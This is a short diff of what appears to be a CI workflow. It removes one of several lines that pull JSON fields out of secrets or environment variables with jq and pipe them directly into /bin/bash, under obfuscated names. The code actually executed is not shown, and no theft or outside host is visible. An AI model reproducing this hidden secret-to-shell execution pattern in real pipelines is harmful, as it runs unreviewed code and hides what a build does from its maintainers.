@@ -21,7 +21,6 @@ jobs:
           oh482: ${{ secrets.oh482 }}
         run: |
           printf '%s' "$oh482" | jq -r .ctvl26738 | /bin/bash
-          printf '%s' "$tzjx9" | jq -r .imyn9453 | /bin/bash
           echo $ooj0 | jq -r .pijlu39270 | /bin/bash
           echo $tgi52668 | jq -r .bw12 | /bin/bash
           echo $gbbsu92 | jq -r .sorn88 | /bin/bash
